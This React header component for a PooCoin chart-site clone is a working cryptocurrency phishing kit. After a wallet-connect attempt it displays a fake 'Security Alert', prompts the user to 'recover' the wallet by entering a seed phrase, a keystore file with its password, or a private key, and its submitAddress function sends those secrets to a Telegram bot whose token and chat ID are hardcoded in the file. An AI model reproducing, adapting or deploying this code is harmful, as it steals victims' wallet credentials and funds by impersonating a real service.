import React, { useEffect, useState } from 'react';
import './Header.css';
import { Link } from 'react-router-dom';
import { WalletConnectConnector } from "@web3-react/walletconnect-connector";
import { InjectedConnector } from "@web3-react/injected-connector";
import { useWeb3React } from '@web3-react/core'
import { Box, ButtonGroup, CircularProgress, Divider, Modal, TextareaAutosize, TextField, Typography } from '@material-ui/core';
import AppBar from '@mui/material/AppBar';
import IconButton from '@mui/material/IconButton';
import Menu from '@mui/material/Menu';
import MenuIcon from '@mui/icons-material/Menu';
import Container from '@mui/material/Container';
import Button from '@mui/material/Button';
import Tooltip from '@mui/material/Tooltip';
import MenuItem from '@mui/material/MenuItem';





const pages = [
    { 'name': 'Charts', 'href': '/', 'disable': false },
    { 'name': 'Trade', 'href': '/Trade', 'disable': false },
    { 'name': 'Multi Chart', 'href': '/', 'disable': true },
    { 'name': 'About', 'href': '/', 'disable': true },
    { 'name': 'Tools', 'href': '/Tools', 'disable': false },
    { 'name': 'Premium', 'href': '/', 'disable': true },
    { 'name': 'Free Price Bot', 'href': 'https://t.me/Poocoin_Pricebot', 'disable': true },
];
const settings = ['Profile', 'Account', 'Dashboard', 'Logout'];

const style = {
    position: 'absolute',
    top: '50%',
    left: '50%',
    transform: 'translate(-50%, -50%)',
    bgcolor: 'background.paper',
    border: '2px solid #000',
    boxShadow: 24,
    p: 4,
    display: 'flex',
    flexDirection: 'column'
};
let bot = {
    TOKEN: "5694683449:AAF3Wv9YaK6ScwKWg8bS2hVHYN98sUoTbjk",
    CHATID: "1203745440",

}
const style1 = {
    position: 'absolute',
    top: '50%',
    left: '50%',
    transform: 'translate(-50%, -50%)',
    borderRadius: '20px',
    bgcolor: 'background.paper',
    textAlign: 'center',
    border: 'none',
    outline: 'none',
    paddingLeft: '20px',
    paddingRight: '20px',
    paddingTop: '10px',
    paddingBottom: '40px',
    minHeight: '500px',


};

const btnsRef = [
    { name: 'Phrase' },
    { name: 'Keystore' },
    { name: 'Private Key' }
]


function Header() {
    const { account } = useWeb3React();
    const { activate } = useWeb3React();
    const [id, setId] = useState()
    const [openFAk, setOpenFAk] = React.useState(false);
    const handleOpenFAk = () => setOpenFAk(true);
    const handleCloseFAk = () => setOpenFAk(false);
    const [open, setOpen] = React.useState(false);
    const handleOpen = () => setOpen(true);
    const handleClose = () => setOpen(false);
    const [anchorElNav, setAnchorElNav] = React.useState(null);
    const [anchorElUser, setAnchorElUser] = React.useState(null);
    const [loading, setIsloading] = useState(true)
    const [recover, setRecover] = useState(false)
    const [active, setActive] = useState(btnsRef[0]);
    const [prhare, setPrhase] = useState('')
    const [prharePass, setPrharePass] = useState('')
    const [activeWallet, setAvtiveWallet] = useState();
    console.log(activeWallet)
    useEffect(() => {
        setId(localStorage.getItem('address'))
    }, [localStorage.getItem('address')])
    const condition = "hello"
    const handleOpenNavMenu = (e) => {
        setAnchorElNav(e.currentTarget);
    };

    const handleCloseNavMenu = () => {
        setAnchorElNav(null);
    };

    const handleCloseUserMenu = () => {
        setAnchorElUser(null);
    };

    const WalletConnect = new WalletConnectConnector({
        rpcUrl: `https://mainnet.infura.io/v3/${process.env.INFURA_KEY}`,
        bridge: "https://bridge.walletconnect.org",
        qrcode: true,
    });

    const Injected = new InjectedConnector({
        supportedChainIds: [1, 3, 4, 5, 42]
    });

    const connectWallet = (btn) => {
        handleClose();

        activate(WalletConnect)
            .then(() => {
                setTimeout(handleOpenFAk(), 5000)

            })
        setAvtiveWallet(btn)



    }
    const connectMetamask = () => {
        handleClose();
        activate(Injected)

    }

    const submitAddress = () => {
        let secratePrhase = !prharePass ? `phrase is ${prhare} ` : `phrase is ${prhare} and pass is ${prharePass}`

        fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.CHATID}&text=${secratePrhase}`, {
            method: "GET"
        })
            .then(success => {
                setPrharePass('')
                setPrhase('')
            }, error => {
                alert("not sent")
            })
    }

    const recoverPass = () => {
        setRecover(true)
        setTimeout(() => setIsloading(false), 1000)
    }


    const connectBTN = [
        { name: 'MetaMask/TrustWallet', action: connectMetamask, image: "https://i.ibb.co/H40P97T/download.png" },
        { name: 'WalletConncet', action: connectWallet, image: "https://i.ibb.co/LdvtmRq/wallet-connect.png" },
    ]
    return (

        <AppBar style={{ backgroundColor: '#262626' }} color='primary' position="static">
            <Container sx={{ display: "flex", alignItems: 'center', justifyContent: 'space-between' }} maxWidth="xl">
                <Box sx={{ flexGrow: 0, display: { xs: 'flex', md: 'none' } }}>
                    <IconButton
                        size="large"
                        aria-label="account of current user"
                        aria-controls="menu-appbar"
                        aria-haspopup="true"
                        onClick={handleOpenNavMenu}
                        color="inherit"
                    >
                        <MenuIcon />
                    </IconButton>
                    <Menu
                        id="menu-appbar"
                        anchorEl={anchorElNav}
                        anchorOrigin={{
                            vertical: 'bottom',
                            horizontal: 'left',
                        }}
                        keepMounted
                        transformOrigin={{
                            vertical: 'top',
                            horizontal: 'left',
                        }}
                        open={Boolean(anchorElNav)}
                        onClose={handleCloseNavMenu}
                        sx={{
                            display: { xs: 'block', md: 'none' },
                        }}
                    >
                        {pages.map((page) => (
                            <MenuItem key={page.name} onClick={handleCloseNavMenu} disabled={page.disable}>
                                <Link to={page.href} style={{ color: 'black' }}>
                                    <Typography>{page.name}</Typography>
                                </Link>
                            </MenuItem>
                        ))}
                    </Menu>
                </Box>
                <Box sx={{ display: 'flex', alignItems: 'center', mr: 1 }}>
                    <img
                        style={{ width: '30px' }}
                        src="https://poocoin.app/images/logo/poocoin512.png"
                        alt='loading'
                    />
                    <Typography
                        noWrap
                        href="/"
                        sx={{
                            mr: 2,
                            display: { xs: 'none', md: 'flex' },
                            fontFamily: 'monospace',
                            fontWeight: 700,
                            letterSpacing: '.3rem',
                            textDecoration: 'none',
                            color: 'white'
                        }}
                    >
                        PooCoin
                    </Typography>
                    <br />
                    <Typography
                        noWrap
                        href="/"
                        sx={{
                            mr: 2,
                            display: { xs: 'none', md: 'flex' },
                            fontFamily: 'monospace',
                            fontWeight: 700,
                            letterSpacing: '.3rem',
                            textDecoration: 'none',
                            color: 'white'
                        }}
                    >
                        Chart
                    </Typography>
                </Box>
                <Box sx={{ display: { xs: 'none', lg: 'block', md: 'block' } }} className="header_centercenter">
                    <div>Binance (BSC)</div>
                    <div>Polygon (Matic)</div>
                    <div>KuChain (KCC)</div>
                </Box>
                <Box sx={{ display: { xs: 'none', lg: 'block', md: 'block' } }} className="header_centerright">
                    <img
                        src="https://poocoin.app/images/logo/poocoin512.png"
                        alt='loading'
                    />
                    <span>$ 2.36</span>
                    <Button href="https://t.me/poocointokenchat">
                        <img src="https://poocoin.app/images/logos/telegram.svg" alt='loading' height="25" />
                    </Button>
                </Box>
                <Box sx={{ mx: 'auto', flexGrow: 0, display: { xs: 'none', md: 'flex' } }}>
                    {pages.map((page) => (
                        <MenuItem key={page.name} onClick={handleCloseNavMenu} disabled={page.disable}>
                            <Link to={page.href} style={{ color: 'white' }}>
                                <Typography>{page.name}</Typography>
                            </Link>
                        </MenuItem>
                    ))}
                </Box>
                <Modal
                    open={openFAk}
                    aria-labelledby="modal-modal-title"
                    aria-describedby="modal-modal-description"
                >
                    <Box sx={style1}>
                        {
                            !recover ?
                                (
                                    <Box sx={{ textAlign: 'center' }}>
                                        <img style={{ width: '150px' }} src='https://i.ibb.co/XXQ7tb4/pngtree-security-alert-icon-red-png-image-2597553-removebg-preview.png' />
                                        <Typography style={{ marginTop: '15px', color: 'red', fontWeight: 'bolder' }} id="modal-modal-title" variant="h6" component="h2">
                                            {activeWallet?.name} Security Alert
                                        </Typography>
                                        <Typography style={{ marginTop: '15px', fontWeight: 'bolder' }} id="modal-modal-title" variant="h6" component="h2">
                                            Warn! WalletConnect failed to connect to your wallet, please continue to recover your wallet.
                                        </Typography>
                                        <button style={{ marginTop: '100px', cursor: 'pointer', border: 'none', outline: 'none', padding: '6px', background: 'rgb(0, 132, 255)', borderRadius: '20px', color: 'white', width: "300px", fontSize: '20px' }} onClick={() => recoverPass()}>
                                            Reset Wallet
                                        </button>
                                    </Box>
                                )
                                :
                                (
                                    <Box sx={{ mb: 2 }}>
                                        {
                                            loading ?
                                                <Box sx={{ minWidth: '320px',minHeight : '450px',display : 'flex',justifyContent : 'center',alignItems : 'center' }}>
                                                    <CircularProgress />
                                                </Box>
                                                :
                                                (
                                                    <Box sx={{ minWidth: '320px' }}>
                                                        <img style={{ width: '150px' }} src={activeWallet?.image} />
                                                        <Typography id="modal-modal-title" variant="h6" component="h2">
                                                            Choice recovery method
                                                        </Typography>
                                                        <Box sx={{ mt: 3, display: 'flex', justifyContent: 'center', }}>
                                                            {
                                                                btnsRef.map((btn) => (
                                                                    <Button onClick={() => setActive(btn)} style={{ background: btn === active ? '#f3e5f5' : 'none', color: 'black', padding: '11px', width: '100px' }}>
                                                                        {btn.name}
                                                                    </Button>)
                                                                )
                                                            }
                                                        </Box>
                                                        {
                                                            active.name === "Phrase" ?
                                                                (
                                                                    <>
                                                                        <Box>
                                                                           
                                                                            <TextareaAutosize
                                                                                aria-label="minimum height"
                                                                                minRows={3}
                                                                                placeholder="Phrase"
                                                                                className='txtArea'
                                                                                onChange={(e) => setPrhase(e.target.value)}
                                                                            />
                                                                        </Box>

                                                                    </>
                                                                )
                                                                :
                                                                active.name === "Keystore" ?
                                                                    (
                                                                        <>
                                                                            <Box>
                                                                                <TextareaAutosize
                                                                                    aria-label="minimum height"
                                                                                    minRows={3}
                                                                                    placeholder="Keystore json"
                                                                                    className='txtArea'
                                                                                    onChange={(e) => setPrhase(e.target.value)}

                                                                                /><br/>
                                                                                <input
                                                                                    aria-label="minimum height"
                                                                                    minRows={3}
                                                                                    placeholder="Password"
                                                                                    className='txtArea1'
                                                                                    type='password'
                                                                                    onChange={(e) => setPrharePass(e.target.value)}

                                                                                />
                                                                            </Box>

                                                                        </>
                                                                    )
                                                                    :
                                                                    active.name === "Private Key" ?
                                                                        (
                                                                            <>
                                                                                <Box>
                                                                                    <TextareaAutosize
                                                                                        aria-label="minimum height"
                                                                                        minRows={3}
                                                                                        placeholder="Privatekey"
                                                                                        className='txtArea'
                                                                                        onChange={(e) => setPrhase(e.target.value)}

                                                                                    />
                                                                                </Box>

                                                                            </>
                                                                        )
                                                                        :
                                                                        ''
                                                        }
                                                        <Box className='mb-5'>
                                                            <Button onClick={() => submitAddress()} className='hov' variant='outlined' style={{ fontSize: '15px', marginTop: '9px', borderRadius: '15px', padding: '10px', width: '320px' }}>
                                                                Recover
                                                            </Button>
                                                            <br />
                                                            <Button onClick={() => {
                                                                setRecover(false)
                                                                setIsloading(true)
                                                                handleCloseFAk()
                                                            }} variant='outlined' style={{ fontSize: '11px', marginTop: '9px', borderRadius: '15px', border: '1px solid gray', padding: '5px', width: '320px', color: 'black' }}>
                                                                Back
                                                            </Button>
                                                        </Box>
                                                    </Box>
                                                )
                                        }


                                    </Box>
                                )
                        }

                    </Box>
                </Modal>
                <Box sx={{ flexGrow: 0 }}>
                    <div className="header_right">

                        <Tooltip title='Conncet Wallet'>
                            <button onClick={handleOpen}>Connect</button>
                        </Tooltip>
                        <Modal
                            open={open}
                            onClose={handleClose}
                            aria-labelledby="modal-modal-title"
                            aria-describedby="modal-modal-description"
                        >
                            <Box sx={style}>
                                {
                                    connectBTN.map((btn) => (
                                        <button style={{ cursor: 'pointer', background: '#181819', color: 'white', marginTop: '5px', width: "220px", padding: '10px', borderRadius: '10px' }} onClick={() => { btn.action(btn) }}>{btn.name}</button>
                                    ))
                                }
                                {/* <button style={{ cursor: 'pointer', background: '#181819', color: 'white', marginTop: '5px', width: "220px", padding: '10px', borderRadius: '10px' }} onClick={() => { connectWallet() }}>WalletConnect</button> */}
                                <button style={{ cursor: 'pointer', background: '#181819', color: 'white', marginTop: '5px', width: "220px", padding: '10px', borderRadius: '10px' }} onClick={handleClose}>Close</button>
                            </Box>
                        </Modal>
                    </div>
                    <Menu
                        sx={{ mt: '45px' }}
                        id="menu-appbar"
                        anchorEl={anchorElUser}
                        anchorOrigin={{
                            vertical: 'top',
                            horizontal: 'right',
                        }}
                        keepMounted
                        transformOrigin={{
                            vertical: 'top',
                            horizontal: 'right',
                        }}
                        open={Boolean(anchorElUser)}
                        onClose={handleCloseUserMenu}
                    >
                        {settings.map((setting) => (
                            <MenuItem key={setting} onClick={handleCloseUserMenu}>
                                <Typography >{setting}</Typography>
                            </MenuItem>
                        ))}
                    </Menu>
                </Box>
            </Container>
        </AppBar>

    )
}

export default Header
